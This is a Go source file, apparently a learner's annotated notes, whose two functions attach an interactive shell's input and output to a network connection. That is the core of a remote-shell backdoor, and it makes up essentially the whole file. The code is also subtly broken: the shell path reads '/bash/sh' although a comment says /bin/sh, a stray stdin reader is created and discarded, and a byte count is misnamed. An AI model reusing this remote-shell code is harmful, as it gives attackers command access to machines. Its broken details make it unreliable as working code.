package os_exec_te

import (
	"bufio"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
)

//在书42页，对该知识点还是不太清楚
/*
注意：stdout输出：是重定向输出，是os中的stdout
对于go的输入输出还需要进一步了解
*/

//flusher包装bufio.Writer，显示刷新所有写入
type Flusher struct {
	w *bufio.Writer
}

//??io中的write和bufio的write的区别
//将操作系统的io转化为缓冲区的io
func NewFlusher(w io.Writer) *Flusher {
	bufio.NewReader(os.Stdin)
	return &Flusher{
		w: bufio.NewWriter(w),
	}
}

//写入数据并刷新缓冲区
func (self *Flusher) Write(b []byte) (int, error) {
	conn, err := self.w.Write(b)
	if err != nil {
		return -1, err
	}
	//Flush进行刷新
	if err = self.w.Flush(); err != nil {
		return -1, err
	}
	return conn, nil
}

//写入数据
func BaseUserExec(conn net.Conn) {
	//显示调用/bin/sh并使用-i进入交互
	cmd := exec.Command("/bash/sh", "-i")
	//将标准输入设置为我们的连接
	cmd.Stdin = conn

	//从连接创建一个FLusher用于标准输出
	// 这样可以确保标准输出被充分刷新并通过net.Conn发送
	cmd.Stdout = NewFlusher(conn)
	//运行命令
	if err := cmd.Run(); err != nil {
		log.Fatalln(err)
	}
}

//利用go语言中的通道pipe

func UserPipe(conn net.Conn) {
	cmd := exec.Command("/bash/sh", "-i")
	//将标准输入设置为我们的连接
	//Pipe创建一个同步的内存中的管道。它可以用于连接期望io.Reader的代码和期望io.Writer的代码
	rp, wp := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = wp
	//将pipe中的reader链接到TCP链接上
	go io.Copy(conn, rp)
	if err := cmd.Run(); err != nil {
		log.Fatalln(err)
	}
	conn.Close()
}
